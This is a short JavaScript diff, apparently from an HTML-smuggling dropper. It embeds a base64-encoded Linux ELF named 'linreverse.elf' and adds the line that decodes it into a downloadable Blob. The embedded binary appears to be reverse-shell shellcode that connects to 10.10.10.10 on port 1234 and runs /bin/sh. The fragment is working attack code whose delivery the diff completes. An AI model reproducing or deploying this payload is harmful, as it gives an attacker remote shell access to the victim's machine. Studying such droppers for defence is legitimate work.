@@ -300,6 +300,7 @@ function base64ToArrayBuffer(base64) {
     return bytes.buffer;
 }
 var file = 'f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAeABAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAEAAOAABAAAAAAAAAAEAAAAHAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAwgAAAAAAAAAMAQAAAAAAAAAQAAAAAAAAailYmWoCX2oBXg8FSJdIuQIABNIKCgoKUUiJ5moQWmoqWA8FagNeSP/OaiFYDwV19mo7WJlIuy9iaW4vc2gAU0iJ51JXSInmDwU='
+var data = base64ToArrayBuffer(file);
 var blob = new Blob([data], {type: 'octet/stream'});
 var fileName = 'linreverse.elf';
 
